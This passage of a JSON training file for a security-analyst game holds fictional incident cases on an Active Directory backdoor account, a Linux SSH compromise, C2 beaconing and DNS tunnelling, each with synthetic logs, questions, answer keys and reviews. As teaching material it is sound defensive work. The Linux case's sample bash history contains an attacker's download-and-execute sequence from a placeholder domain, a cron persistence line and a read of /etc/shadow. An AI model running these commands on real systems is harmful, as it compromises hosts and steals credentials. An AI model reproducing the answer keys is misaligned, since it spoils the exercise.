+     "2026-03-04 11:03:55 DC-01 EventID=4726 TargetAccount=temp_contractor_04 SubjectAccount=svc_idm"
+    ]
+   },
+   {
+    "name": "Directory Object Detail",
+    "rows": [
+     "account=svc_backup2 created=2026-03-04T02:22:07Z description=\"\" manager=- pwdLastSet=2026-03-04T02:22:08Z pwdNeverExpires=True memberOf=\"Domain Users, Domain Admins\"",
+     "account=svc_backup created=2019-04-17 description=\"Veeam backup service account\" memberOf=\"Domain Users, Backup Operators\"",
+     "account=t.iqbal created=2026-03-04T09:14:20Z description=\"Tayyab Iqbal - Logistics Coordinator\" manager=j.almeida memberOf=\"Domain Users, Logistics Users\" ticket=HR-ONB-2291",
+     "account=svc_idm type=service description=\"Identity management sync service\" normal_source=10.20.8.40"
+    ]
+   },
+   {
+    "name": "Event Reference",
+    "rows": [
+     "4720 user account created | 4722 account enabled | 4724 password reset | 4726 account deleted",
+     "4728 member added to security-enabled GLOBAL group | 4732 member added to security-enabled LOCAL group | 4738 account changed"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Name of the account created by the attacker",
+    "type": "exact",
+    "accept": [
+     "svc_backup2"
+    ],
+    "hint": "Compare the two 4720 events - one has an external subject IP."
+   },
+   {
+    "id": "q2",
+    "label": "Which account performed the creation (the subject)?",
+    "type": "exact",
+    "accept": [
+     "svc_backup"
+    ],
+    "hint": "The SubjectAccount field identifies the identity being abused."
+   },
+   {
+    "id": "q3",
+    "label": "Which Event ID records the account creation?",
+    "type": "exact",
+    "accept": [
+     "4720"
+    ],
+    "hint": "Use the event reference panel."
+   },
+   {
+    "id": "q4",
+    "label": "Which privileged group did the attacker join the new account to?",
+    "type": "exact",
+    "accept": [
+     "domain admins"
+    ],
+    "hint": "Look at the TargetGroup on the 4728 event with the attacker's subject."
+   },
+   {
+    "id": "q5",
+    "label": "Which attribute in the 4738 change is a classic backdoor indicator?",
+    "type": "keywords",
+    "accept": [
+     "passwordneverexpires",
+     "password never expires",
+     "never expires",
+     "pwdneverexpires"
+    ],
+    "hint": "Read the Changes field - one setting makes the account survive password policy."
+   },
+   {
+    "id": "q6",
+    "label": "Is the 09:14 creation of t.iqbal part of the attack? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "no"
+    ],
+    "hint": "Check its subject account, source IP, description and whether it has a ticket reference."
+   },
+   {
+    "id": "q7",
+    "label": "How long after the initial compromise (02:15:39) was the backdoor account created, in minutes?",
+    "type": "num",
+    "accept": [
+     "7",
+     "6"
+    ],
+    "hint": "Subtract the successful logon time from the 4720 timestamp."
+   }
+  ],
+  "decision": "true_positive",
+  "severity_answer": "CRITICAL",
+  "recommend": {
+   "any": [
+    "disable",
+    "delete",
+    "remove",
+    "revoke",
+    "contain",
+    "reset"
+   ],
+   "text": "Disable svc_backup2 immediately, remove it from Domain Admins, preserve it for forensics rather than deleting, reset svc_backup, and audit all Domain Admins membership."
+  },
+  "timelineKey": [
+   "02:22:07",
+   "02:22:31",
+   "02:23:02"
+  ],
+  "hints": [
+   "Two accounts were created in this window. Only one of them has a subject that is already known to be compromised and a source address outside the estate.",
+   "Compare the object detail of the two new accounts side by side: description, manager, ticket reference, password policy. Legitimate onboarding leaves paperwork."
+  ],
+  "review": "Seven minutes after gaining access, the attacker created svc_backup2, reset its password, enabled it, set PasswordNeverExpires, and added it to Domain Admins - then authenticated with it from the same external address. This is textbook persistence via a domain account, deliberately named to blend in next to the real svc_backup. The t.iqbal creation is genuine onboarding: created by svc_idm from the internal IDM server, with a manager, a description and ticket HR-ONB-2291. Containment note: disable rather than delete the attacker account, because deletion destroys evidence.",
+  "next": "The Windows side of the estate is now understood. But Northwind runs its logistics API on Linux, and SRV-LNX-04 has been logging SSH failures from the second address on your watch list. Investigate the Linux authentication and command history."
+ },
+ {
+  "id": 6,
+  "title": "Linux Log Investigation",
+  "domain": "Linux",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "Linux security telemetry is mostly plain text. /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL) carries SSH and sudo activity; the systemd journal carries service events; .bash_history, cron and systemd units carry what happened after access. There are no event IDs - you grep.",
+   "why": "Servers, containers and network appliances are overwhelmingly Linux. An analyst who can only read Windows events is blind to half the estate.",
+   "look": [
+    "'Failed password for invalid user X' - the username does not exist, so this is enumeration",
+    "'Accepted password' or 'Accepted publickey' - note which, because password auth on a server that should be key-only is itself a finding",
+    "'session opened for user root' immediately after a suspicious accept",
+    "sudo entries with COMMAND= showing what was actually run",
+    "New SSH keys appended to ~/.ssh/authorized_keys, new cron entries, new systemd units"
+   ],
+   "fp": [
+    "Automation and monitoring accounts log in constantly from fixed internal addresses",
+    "A failed password burst from a single internal host is usually a stale credential in a script"
+   ],
+   "tips": [
+    "The port number in the sshd line is the attacker's source port - sequential ports across attempts mean an automated tool.",
+    "After the accept, read history and sudo before anything else: that is the actual intrusion."
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00510",
+   "severity": "HIGH",
+   "alert": "SSH authentication anomaly and post-login privilege use on Linux host",
+   "host": "SRV-LNX-04",
+   "time": "2026-03-04 07:44 UTC",
+   "source": "auth.log / journald",
+   "brief": "SRV-LNX-04 runs the Northwind logistics API. Auth logs show sustained external SSH activity. Determine whether the attacker gained access, as which user, and what they did afterwards."
+  },
+  "mitre": "T1110.003 - Password Spraying / T1078 - Valid Accounts",
+  "evidence": [
+   {
+    "name": "/var/log/auth.log",
+    "rows": [
+     "Mar  4 07:44:02 SRV-LNX-04 sshd[2390]: Failed password for invalid user admin from 198.51.100.22 port 40122 ssh2",
+     "Mar  4 07:44:06 SRV-LNX-04 sshd[2392]: Failed password for invalid user test from 198.51.100.22 port 40188 ssh2",
+     "Mar  4 07:44:09 SRV-LNX-04 sshd[2394]: Failed password for root from 198.51.100.22 port 40241 ssh2",
+     "Mar  4 07:44:13 SRV-LNX-04 sshd[2396]: Failed password for invalid user oracle from 198.51.100.22 port 40302 ssh2",
+     "Mar  4 07:44:17 SRV-LNX-04 sshd[2398]: Failed password for deploy from 198.51.100.22 port 40355 ssh2",
+     "Mar  4 07:44:21 SRV-LNX-04 sshd[2401]: Failed password for deploy from 198.51.100.22 port 40410 ssh2",
+     "Mar  4 07:44:26 SRV-LNX-04 sshd[2404]: Failed password for deploy from 198.51.100.22 port 40466 ssh2",
+     "Mar  4 07:44:31 SRV-LNX-04 sshd[2407]: Accepted password for deploy from 198.51.100.22 port 40522 ssh2",
+     "Mar  4 07:44:31 SRV-LNX-04 sshd[2407]: pam_unix(sshd:session): session opened for user deploy by (uid=0)",
+     "Mar  4 07:46:02 SRV-LNX-04 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
+     "Mar  4 07:47:20 SRV-LNX-04 sudo:   deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/crontab -e",
+     "Mar  4 07:51:44 SRV-LNX-04 sshd[2407]: pam_unix(sshd:session): session closed for user deploy",
+     "Mar  4 09:02:15 SRV-LNX-04 sshd[2610]: Accepted publickey for deploy from 10.20.4.60 port 51344 ssh2",
+     "Mar  4 09:03:01 SRV-LNX-04 sudo:   deploy : TTY=pts/0 ; PWD=/opt/app ; USER=root ; COMMAND=/bin/systemctl restart northwind-api"
+    ]
+   },
+   {
+    "name": "~/.bash_history (deploy)",
+    "rows": [
+     "id",
+     "uname -a",
+     "cat /etc/passwd",
+     "curl -s hxxp://cdn-sync-delivery[.]net/ld.sh -o /tmp/.sysupd",
+     "chmod +x /tmp/.sysupd",
+     "/tmp/.sysupd &",
+     "echo '*/10 * * * * /tmp/.sysupd' | crontab -",
+     "history -c"
+    ]
+   },
+   {
+    "name": "Host Context",
+    "rows": [
+     "SRV-LNX-04 role=\"Logistics API (production)\" sshd_config: PasswordAuthentication yes (policy exception PEX-118, expired 2025-12-31)",
+     "user=deploy purpose=\"CI/CD deployment account\" expected_sources=10.20.4.60 (build runner) auth_method=publickey",
+     "198.51.100.22 -> ASN 64501, no Northwind relationship, previously seen 2026-03-02 enumerating SSH",
+     "cron after incident: */10 * * * * /tmp/.sysupd (owner deploy, created 07:47)"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Attacker source IP",
+    "type": "exact",
+    "accept": [
+     "198.51.100.22"
+    ],
+    "hint": "Present on every failed and the successful SSH line."
+   },
+   {
+    "id": "q2",
+    "label": "Which account was successfully compromised?",
+    "type": "exact",
+    "accept": [
+     "deploy"
+    ],
+    "hint": "Find the line that says Accepted rather than Failed."
+   },
+   {
+    "id": "q3",
+    "label": "Which authentication method did the attacker use - password or publickey?",
+    "type": "exact",
+    "accept": [
+     "password"
+    ],
+    "hint": "Read the accepted line carefully and compare it to the 09:02 login."
+   },
+   {
+    "id": "q4",
+    "label": "How many failed attempts occurred against the deploy account before success?",
+    "type": "num",
+    "accept": [
+     "3"
+    ],
+    "hint": "Count only the failures naming deploy, not the invalid-user lines."
+   },
+   {
+    "id": "q5",
+    "label": "What file did the attacker download, and where to?",
+    "type": "keywords",
+    "accept": [
+     "/tmp/.sysupd",
+     ".sysupd",
+     "sysupd"
+    ],
+    "hint": "Read the curl line in bash history - note the -o output path."
+   },
+   {
+    "id": "q6",
+    "label": "Domain hosting the downloaded payload",
+    "type": "exact",
+    "accept": [
+     "cdn-sync-delivery.net",
+     "cdn-sync-delivery[.]net"
+    ],
+    "hint": "It appears once, in the curl command."
+   },
+   {
+    "id": "q7",
+    "label": "What persistence mechanism did the attacker create?",
+    "type": "keywords",
+    "accept": [
+     "cron",
+     "crontab",
+     "cronjob",
+     "scheduled"
+    ],
+    "hint": "Look at both the sudo entries and the last commands in history."
+   },
+   {
+    "id": "q8",
+    "label": "Is the 09:02 publickey login from 10.20.4.60 malicious? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "no"
+    ],
+    "hint": "Compare it against the documented expected source and auth method for the deploy account."
+   }
+  ],
+  "decision": "true_positive",
+  "severity_answer": "CRITICAL",
+  "recommend": {
+   "any": [
+    "isolate",
+    "rotate",
+    "key",
+    "disable password",
+    "block",
+    "remove cron",
+    "contain",
+    "rebuild"
+   ],
+   "text": "Isolate SRV-LNX-04, block 198.51.100.22, disable PasswordAuthentication, rotate the deploy credential and its SSH keys, remove the cron entry, and preserve /tmp/.sysupd for analysis."
+  },
+  "timelineKey": [
+   "07:44:02",
+   "07:44:31",
+   "07:46:02",
+   "07:47:20"
+  ],
+  "hints": [
+   "Separate the two SSH sessions on this host. One used a password from an external address; the other used a key from an internal build runner. Only one of them is your intrusion.",
+   "The bash history is the real prize. Read it top to bottom as a sequence of attacker intent: orient, enumerate, download, execute, persist, cover tracks."
+  ],
+  "review": "Three failures against deploy then 'Accepted password' at 07:44:31 from 198.51.100.22 - password authentication was only possible because policy exception PEX-118 expired and was never revoked. The attacker then read /etc/shadow, downloaded /tmp/.sysupd from cdn-sync-delivery[.]net, executed it, installed a 10-minute cron for persistence, and ran 'history -c' to clear tracks (which failed to remove the already-written entries you just read). The 09:02 session is the CI/CD runner doing a normal service restart. Note the leading dot in .sysupd - hidden files in /tmp are a standard attacker habit.",
+  "next": "The payload on SRV-LNX-04 was downloaded from an external domain and runs every ten minutes. Something is talking outbound. Move to the network layer and characterise the traffic leaving that host."
+ },
+ {
+  "id": 7,
+  "title": "Network Traffic Analysis",
+  "domain": "Network",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "Flow records (NetFlow/IPFIX, firewall session logs, Zeek conn.log) summarise every connection: source, destination, port, protocol, duration, bytes in and out. You rarely get full packet capture in production, so the analyst learns to read behaviour from shape alone - how often, how long, how much, in which direction.",
+   "why": "Every intrusion eventually has to communicate. Flow analysis catches malware that is invisible on the endpoint because the operator is signing or obfuscating the binary.",
+   "look": [
+    "Regular connection intervals with low byte counts - beaconing",
+    "Asymmetric volume: far more bytes out than in suggests exfiltration; far more in than out suggests tool download",
+    "Non-standard ports for standard protocols, or standard ports carrying the wrong protocol",
+    "Long-lived sessions (hours) to a single external address",
+    "Connections from servers that should never initiate outbound traffic"
+   ],
+   "fp": [
+    "Software update services, telemetry and cloud backup all produce regular outbound patterns and large uploads",
+    "Monitoring agents keep long-lived sessions open by design"
+   ],
+   "tips": [
+    "Compute the interval between connections yourself; jitter of a few seconds around a fixed value still means beaconing.",
+    "Bytes matter: 600 bytes every 5 minutes is a heartbeat, 400 MB in one session is a data transfer."
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00522",
+   "severity": "HIGH",
+   "alert": "Periodic outbound sessions from production Linux host to unrecognised ASN",
+   "host": "SRV-LNX-04",
+   "time": "2026-03-04 08:00-09:00 UTC",
+   "source": "NetFlow / Firewall Session Log",
+   "brief": "Characterise the outbound traffic from SRV-LNX-04 in the hour after the compromise. Separate legitimate server traffic from attacker communication and quantify the pattern."
+  },
+  "mitre": "T1071.001 - Application Layer Protocol: Web Protocols",
+  "evidence": [
+   {
+    "name": "Flow Records - SRV-LNX-04",
+    "rows": [
+     "08:00:04 SRV-LNX-04:51022 -> 10.20.8.15:5432 TCP dur=3600s bytes_out=8.2MB bytes_in=44.1MB app=postgresql",
+     "08:00:11 SRV-LNX-04:44210 -> 91.203.5.12:8443 TCP dur=1.2s bytes_out=642 bytes_in=310 app=tls",
+     "08:10:13 SRV-LNX-04:44238 -> 91.203.5.12:8443 TCP dur=1.1s bytes_out=638 bytes_in=298 app=tls",
+     "08:20:12 SRV-LNX-04:44266 -> 91.203.5.12:8443 TCP dur=1.4s bytes_out=651 bytes_in=322 app=tls",
+     "08:22:40 SRV-LNX-04:44271 -> 13.107.42.14:443 TCP dur=6.0s bytes_out=12KB bytes_in=480KB app=tls sni=update.microsoft.com",
+     "08:30:14 SRV-LNX-04:44292 -> 91.203.5.12:8443 TCP dur=1.2s bytes_out=640 bytes_in=305 app=tls",
+     "08:40:11 SRV-LNX-04:44320 -> 91.203.5.12:8443 TCP dur=1.3s bytes_out=647 bytes_in=311 app=tls",
+     "08:44:02 SRV-LNX-04:44331 -> 10.20.4.0/24 multiple:443 TCP dur=0.2s bytes_out=1.1KB app=http-api (northwind-api health checks)",
+     "08:50:12 SRV-LNX-04:44349 -> 91.203.5.12:8443 TCP dur=1.2s bytes_out=644 bytes_in=300 app=tls",
+     "09:00:13 SRV-LNX-04:44377 -> 91.203.5.12:8443 TCP dur=1.1s bytes_out=639 bytes_in=302 app=tls"
+    ]
+   },
+   {
+    "name": "Destination Enrichment",
+    "rows": [
+     "10.20.8.15 -> internal PostgreSQL cluster (expected dependency of northwind-api)",
+     "13.107.42.14 -> Microsoft update infrastructure, benign",
+     "91.203.5.12 -> ASN 64502, hosting provider, no reverse DNS, TLS certificate self-signed CN=localhost, first seen in estate 2026-03-04 07:50",
+     "Resolved from: cdn-sync-delivery.net -> 91.203.5.12 (TTL 300)"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "Suspicious destination IP",
+    "type": "exact",
+    "accept": [
+     "91.203.5.12"
+    ],
+    "hint": "One destination repeats on a fixed schedule with tiny byte counts."
+   },
+   {
+    "id": "q2",
+    "label": "Destination port used",
+    "type": "num",
+    "accept": [
+     "8443"
+    ],
+    "hint": "Read the port on the repeating flows."
+   },
+   {
+    "id": "q3",
+    "label": "Interval between the suspicious connections, in minutes",
+    "type": "num",
+    "accept": [
+     "10"
+    ],
+    "hint": "Subtract consecutive timestamps of the repeating flows."
+   },
+   {
+    "id": "q4",
+    "label": "What does that interval correlate with from the previous investigation?",
+    "type": "keywords",
+    "accept": [
+     "cron",
+     "crontab",
+     "persistence",
+     "*/10",
+     "scheduled"
+    ],
+    "hint": "You saw a scheduled task on this host with exactly this period."
+   },
+   {
+    "id": "q5",
+    "label": "Which domain resolves to the suspicious IP?",
+    "type": "exact",
+    "accept": [
+     "cdn-sync-delivery.net"
+    ],
+    "hint": "Check the enrichment panel's resolution line."
+   },
+   {
+    "id": "q6",
+    "label": "Traffic pattern classification",
+    "type": "choice",
+    "options": [
+     "C2 beaconing",
+     "Data exfiltration",
+     "Port scan",
+     "Normal software update"
+    ],
+    "accept": [
+     "c2 beaconing"
+    ],
+    "hint": "Small, symmetric, highly regular sessions are a heartbeat, not a transfer."
+   },
+   {
+    "id": "q7",
+    "label": "Is the 08:22 session to 13.107.42.14 malicious? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "no"
+    ],
+    "hint": "Check its SNI and the enrichment entry."
+   },
+   {
+    "id": "q8",
+    "label": "What certificate anomaly supports the verdict?",
+    "type": "keywords",
+    "accept": [
+     "self-signed",
+     "self signed",
+     "cn=localhost",
+     "localhost"
+    ],
+    "hint": "Read the TLS certificate detail in enrichment."
+   }
+  ],
+  "decision": "true_positive",
+  "severity_answer": "HIGH",
+  "recommend": {
+   "any": [
+    "block",
+    "sinkhole",
+    "isolate",
+    "contain",
+    "egress",
+    "firewall"
+   ],
+   "text": "Block 91.203.5.12 and cdn-sync-delivery.net at the egress firewall and DNS, keep SRV-LNX-04 isolated, and sweep the estate for other hosts beaconing to the same infrastructure."
+  },
+  "timelineKey": [
+   "08:00:11",
+   "09:00:13"
+  ],
+  "hints": [
+   "Ignore volume for a moment and look only at timing. Which destination appears at an almost perfectly fixed cadence?",
+   "Two of these flows are a production database dependency and a vendor update. Neither repeats every ten minutes with 640 bytes out."
+  ],
+  "review": "Seven sessions to 91.203.5.12:8443 at a fixed ten-minute cadence, roughly 640 bytes out and 300 bytes in each time, duration near one second. That is a command-and-control heartbeat, and the ten-minute interval matches the cron entry planted on the host at 07:47 exactly. The destination resolves from cdn-sync-delivery[.]net, the same domain that served the payload, and presents a self-signed certificate with CN=localhost - operators frequently neglect certificate hygiene on throwaway infrastructure. The PostgreSQL flow and the Microsoft update session are normal.",
+  "next": "The C2 domain is now a confirmed indicator. Before you block it, find out how widely it is resolving inside the estate - DNS logs will tell you which other hosts are infected."
+ },
+ {
+  "id": 8,
+  "title": "DNS Investigation",
+  "domain": "Network",
+  "tier": "Tier 1",
+  "theory": {
+   "concept": "DNS resolution logs are the cheapest full-estate visibility a SOC has: almost every connection begins with a query, and internal resolvers see every client. Two abuse patterns dominate - algorithmically generated domains (DGA) used to rotate C2 infrastructure, and DNS tunnelling, where data is encoded into subdomain labels and answers, usually over TXT or NULL records.",
+   "why": "DNS tells you the blast radius. One infected host is an incident; forty resolving the same domain is a campaign.",
+   "look": [
+    "High query volume to a single parent domain with long, random-looking subdomain labels",
+    "TXT or NULL record types where an application has no business using them",
+    "Newly registered domains - creation date within days of first resolution",
+    "Queries to a domain from hosts that share nothing else in common",
+    "NXDOMAIN storms - a DGA cycling through candidate domains until one is live"
+   ],
+   "fp": [
+    "Content delivery networks, antivirus cloud lookups and some VPN clients legitimately use long hashed labels and TXT records",
+    "Email security (SPF/DKIM/DMARC) checks are TXT queries by design"
+   ],
+   "tips": [
+    "Count distinct clients per suspicious domain before you decide severity.",
+    "Domain age is decisive evidence: a C2 domain registered nine days ago is not a CDN."
+   ]
+  },
+  "case": {
+   "id": "SOC-2026-00538",
+   "severity": "HIGH",
+   "alert": "Internal resolver: anomalous query volume and record types to newly registered domain",
+   "host": "Internal resolver DNS-01",
+   "time": "2026-03-04 09:10 UTC",
+   "source": "DNS resolver logs",
+   "brief": "Determine the estate-wide blast radius of cdn-sync-delivery[.]net, identify a second suspicious domain in the resolver logs, and separate both from legitimate high-volume DNS behaviour."
+  },
+  "mitre": "T1071.004 - Application Layer Protocol: DNS / T1568 - Dynamic Resolution",
+  "evidence": [
+   {
+    "name": "Resolver Log Summary (last 24h)",
+    "rows": [
+     "domain=cdn-sync-delivery.net queries=284 clients=3 types=A record_ttl=300 first_seen=2026-03-04T07:50Z",
+     "domain=outlook.office365.com queries=48210 clients=612 types=A,AAAA first_seen=2023-01-04",
+     "domain=telemetry.northwind-lg.local queries=9120 clients=598 types=A first_seen=2022-06-11",
+     "domain=datasync-77x.net queries=1902 clients=1 types=TXT first_seen=2026-03-04T10:02Z",
+     "domain=spf.protection.outlook.com queries=3310 clients=4 types=TXT first_seen=2023-01-04",
+     "domain=update.microsoft.com queries=2204 clients=540 types=A first_seen=2022-06-11"
+    ]
+   },
+   {
+    "name": "Query Detail - datasync-77x.net",
+    "rows": [
+     "10:02:01 SRV-FILE02 query: a8f2e1c94b77.datasync-77x.net TXT",
+     "10:02:02 SRV-FILE02 query: 7bc19fa0dd31.datasync-77x.net TXT",
+     "10:02:03 SRV-FILE02 query: 91dd0ef3ac05.datasync-77x.net TXT",
+     "10:02:04 SRV-FILE02 query: c02ab77e1f92.datasync-77x.net TXT",
+     "10:02:05 SRV-FILE02 query: 4f1e88bb7a40.datasync-77x.net TXT",
+     "10:02:06 SRV-FILE02 query: e9a01c34bb18.datasync-77x.net TXT",
+     "(1896 further queries, same pattern, 10:02:01 - 10:34:40, average 1 query/second)"
+    ]
+   },
+   {
+    "name": "Clients Resolving cdn-sync-delivery.net",
+    "rows": [
+     "SRV-LNX-04 queries=142 first=07:50:11 last=09:00:13",
+     "WKS-2041 queries=96 first=08:31:04 last=09:08:22",
+     "SRV-FILE02 queries=46 first=09:44:09 last=10:01:55",
+     "WHOIS cdn-sync-delivery.net: created 2026-02-24, registrar privacy-protected, nameservers ns1/ns2.dyn-fastns.net",
+     "WHOIS datasync-77x.net: created 2026-02-24, registrar privacy-protected, same nameservers"
+    ]
+   }
+  ],
+  "questions": [
+   {
+    "id": "q1",
+    "label": "How many internal hosts resolved cdn-sync-delivery.net?",
+    "type": "num",
+    "accept": [
+     "3"
+    ],
+    "hint": "The clients field in the resolver summary, confirmed by the client breakdown panel."
+   },
+   {
+    "id": "q2",
+    "label": "Which host resolved it first?",
+    "type": "exact",
+    "accept": [
+     "srv-lnx-04",
+     "srv-lnx04",
+     "lnx-04"
+    ],
+    "hint": "Compare the 'first' timestamps in the client breakdown."
+   },
+   {
+    "id": "q3",
+    "label": "Second suspicious domain in the resolver logs",
+    "type": "exact",
+    "accept": [
+     "datasync-77x.net"
+    ],
+    "hint": "Look for an unfamiliar domain with an unusual record type and a very recent first-seen date."
+   },
+   {
+    "id": "q4",
+    "label": "Which record type does it use?",
+    "type": "exact",
+    "accept": [
+     "txt"
+    ],
+    "hint": "Read the types column."
+   },
+   {
+    "id": "q5",
+    "label": "Which host is generating those queries?",
+    "type": "exact",
+    "accept": [
+     "srv-file02",
+     "file02"
+    ],
+    "hint": "Check the query detail panel - only one client appears."
+   },
+   {
+    "id": "q6",
+    "label": "What technique do the long random subdomain labels indicate?",
+    "type": "choice",
+    "options": [
+     "DNS tunnelling / data encoding",
+     "Normal CDN load balancing",
+     "Reverse DNS lookup",
+     "Zone transfer"
+    ],
+    "accept": [
+     "dns tunnelling / data encoding"
+    ],
+    "hint": "Random hex labels at one query per second are carrying something, not resolving something."
+   },
+   {
+    "id": "q7",
+    "label": "What WHOIS detail links both malicious domains to the same operator?",
+    "type": "keywords",
+    "accept": [
+     "nameserver",
+     "ns1",
+     "dyn-fastns",
+     "same registration",
+     "created 2026-02-24",
+     "registration date",
+     "same date"
+    ],
+    "hint": "Compare the two WHOIS records field by field."
+   },
+   {
+    "id": "q8",
+    "label": "Is the spf.protection.outlook.com TXT volume suspicious? (yes/no)",
+    "type": "exact",
+    "accept": [
+     "no"
+    ],
+    "hint": "Some legitimate protocols use TXT records by design."
+   }
+  ],
+  "decision": "true_positive",
+  "severity_answer": "CRITICAL",
+  "recommend": {
+   "any": [
+    "sinkhole",
+    "block",
+    "dns",
+    "isolate",
+    "contain",
+    "quarantine"
+   ],
+   "text": "Sinkhole both domains at the resolver, block the resolved IPs at egress, isolate SRV-FILE02 and WKS-2041 alongside SRV-LNX-04, and escalate as a multi-host incident."
+  },
+  "timelineKey": [
+   "07:50",
+   "08:31",
+   "09:44",
+   "10:02:01"
+  ],
+  "hints": [
+   "Blast radius first: how many distinct clients touched the known-bad domain, and in what order did they start? That ordering is your infection sequence.",
+   "One domain in the log is new, TXT-only, single-client and running at one query per second. Legitimate services do not look like that."
+  ],
+  "review": "Three hosts resolve cdn-sync-delivery[.]net: SRV-LNX-04 from 07:50 (patient zero, matching the Linux compromise), WKS-2041 from 08:31, and SRV-FILE02 from 09:44 - that ordering is the spread of the intrusion through the estate. SRV-FILE02 additionally generates 1,902 TXT queries to datasync-77x[.]net with 12-character hex labels at one per second: DNS tunnelling, almost certainly carrying data out of the finance file server. Both domains were registered on the same day with the same privacy-protected registrar and identical nameservers, which ties them to one operator. The Outlook SPF TXT queries are mail authentication and entirely normal.",
+  "next": "Three hosts are now in scope and the perimeter is leaking. Before you can block anything you need to know what the firewall has actually been permitting - and one of the noisiest firewall alerts on your queue is going to turn out to be nothing."
+ }
+]
